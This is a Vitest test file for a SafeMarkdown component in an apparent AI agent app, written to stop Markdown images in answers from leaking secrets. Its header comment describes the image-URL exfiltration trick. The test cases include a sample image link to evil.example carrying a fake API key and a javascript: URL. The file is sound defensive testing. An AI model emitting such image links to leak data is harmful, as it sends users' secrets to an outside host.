import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it } from "vitest";

import { SafeMarkdown, classifyImageSrc } from "@/components/markdown/SafeMarkdown";
import { I18nProvider } from "@/lib/i18n";

/**
 * An image in an answer is a request the WebView makes on its own, to whatever host the answer
 * names. `![x](https://host/?d=<secret>)` is the classic way to get a secret out of a Markdown
 * renderer, and it bypasses the taint ledger and the egress allowlist, which govern the agent and
 * not the screen. These tests hold the component to: nothing remote is ever mounted as an `<img>`,
 * and the images that are not a request to anybody still render.
 */

// Vitest's jsdom origin, so "this app's own origin" means the same thing to the test and the code.
const ORIGIN = window.location.origin;
const PIXEL = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";

function show(markdown: string) {
  return render(
    <I18nProvider>
      <SafeMarkdown>{markdown}</SafeMarkdown>
    </I18nProvider>,
  );
}

describe("SafeMarkdown", () => {
  it("never mounts a remote image, before or after the person clicks it", async () => {
    const user = userEvent.setup();
    const { container } = show("Done. ![status](https://evil.example/pixel.png?d=sk-live-123)");

    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByTestId("markdown-external-image");
    // The host is named, so the person decides knowing where the request would go.
    expect(link).toHaveTextContent(/external image from evil\.example/i);
    expect(link).toHaveAttribute("href", "https://evil.example/pixel.png?d=sk-live-123");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link.getAttribute("rel")).toContain("noreferrer");

    await user.click(link);
    // Opening is the browser's job, outside this page: nothing is fetched into the answer.
    expect(container.querySelector("img")).toBeNull();
  });

  it("renders an image embedded in the answer", () => {
    // react-markdown's default transform empties a data: URL; the image would vanish silently.
    const { container } = show(`![chart](${PIXEL})`);
    expect(container.querySelector("img")).toHaveAttribute("src", PIXEL);
    expect(screen.queryByTestId("markdown-external-image")).toBeNull();
  });

  it("renders a blob image and the workspace image endpoint", () => {
    const blob = `blob:${ORIGIN}/0b7d3c4e-1111-2222-3333-444455556666`;
    const { container } = show(`![a](${blob}) ![b](/api/fs/image?path=out/chart.png)`);
    const srcs = [...container.querySelectorAll("img")].map((img) => img.getAttribute("src"));
    expect(srcs).toEqual([blob, "/api/fs/image?path=out/chart.png"]);
  });

  it("names a relative path as written instead of mounting it", () => {
    // `chart.png` resolves to this origin, where it is not an image but the app's own page —
    // shown as the file the answer mentioned, not as "an image from 127.0.0.1".
    const { container } = show("![x](chart.png)");
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByTestId("markdown-external-image")).toHaveTextContent("chart.png");
  });

  it("drops a script URL entirely", () => {
    const { container } = show("![x](javascript:alert(1))");
    expect(container.querySelector("img")).toBeNull();
    expect(screen.queryByTestId("markdown-external-image")).toBeNull();
  });
});

describe("classifyImageSrc", () => {
  it("treats only embedded bytes and this origin's image endpoint as safe to fetch", () => {
    expect(classifyImageSrc("data:image/svg+xml;base64,PHN2Zy8+", ORIGIN)).toEqual({ kind: "inline" });
    expect(classifyImageSrc(`${ORIGIN}/api/fs/image?path=a.png`, ORIGIN)).toEqual({ kind: "local" });
  });

  it("names the host of anything else, however it is spelled", () => {
    expect(classifyImageSrc("//evil.example/x.png", ORIGIN)).toEqual({ kind: "external", label: "evil.example" });
    expect(classifyImageSrc("HTTPS://Evil.Example:8443/x", ORIGIN)).toEqual({ kind: "external", label: "evil.example:8443" });
    // The endpoint's PATH on another origin is still another origin.
    expect(classifyImageSrc("https://evil.example/api/fs/image?path=a.png", ORIGIN)).toEqual({
      kind: "external",
      label: "evil.example",
    });
    // A data: URL that is not an image is not an image.
    expect(classifyImageSrc("data:text/html,<b>x</b>", ORIGIN).kind).toBe("external");
  });
});

// Every source file, verbatim — the same glob the design-system gate reads.
const sources = import.meta.glob("../../**/*.{ts,tsx}", {
  query: "?raw",
  import: "default",
  eager: true,
}) as Record<string, string>;

describe("every answer renderer", () => {
  it("goes through SafeMarkdown, so a new one cannot quietly bring the image channel back", () => {
    // The page policy is the first layer; this keeps the second one from being bypassed by the
    // next screen that renders an answer with a bare `<Markdown>`.
    const direct = Object.entries(sources)
      .filter(([path]) => !/SafeMarkdown(\.test)?\.tsx$/.test(path))
      .filter(([, text]) => /from\s+["']react-markdown["']/.test(text))
      .map(([path]) => path);
    expect(Object.keys(sources).length).toBeGreaterThan(100);
    expect(direct).toEqual([]);
  });
});
